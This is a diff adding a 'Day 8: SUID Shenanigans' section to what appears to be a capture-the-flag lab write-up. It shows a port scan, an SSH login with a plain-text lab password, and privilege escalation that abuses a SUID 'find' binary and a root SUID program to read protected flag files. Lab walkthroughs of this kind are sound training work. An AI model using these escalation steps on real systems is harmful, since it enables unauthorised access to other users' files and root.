@@ -252,10 +252,55 @@ Answer
 
 ## Day 8: SUID Shenanigans
 
+scan the target
 
+```
+nmap -p- -T4 10.10.192.12
+```
 
+it took too much time to find, but the hint suggest us ssh is running on port 65534
 
+![image](https://user-images.githubusercontent.com/90561566/209459903-53089b6c-9f7d-475d-a595-3160ca16da7e.png)
 
+```
+ssh holly@10.10.192.12 -p65534
+tuD@4vt0G*TU
+```
+
+```
+ls -l /usr/bin/find
+```
+
+find command is actually owned by Igor and he has SUID permission
+
+![image](https://user-images.githubusercontent.com/90561566/209460158-0b3db96e-f9e0-4c9a-955b-0bb4b5a58573.png)
+
+```
+find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209460222-9c76f61b-fbb9-40e3-8bc3-111f54f515ed.png)
+
+find root binary
+
+```
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin"
+```
+
+i found /usr/bin/system-control has execute permission
+
+```
+system-control
+cat /root/flag2.txt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209460328-c071a878-8094-462e-8bae-b3f462cb04a3.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/209460368-d1488727-ede9-4d69-bf00-984f3f3f37ff.png)
+
+## Day 9: 
 
 
 
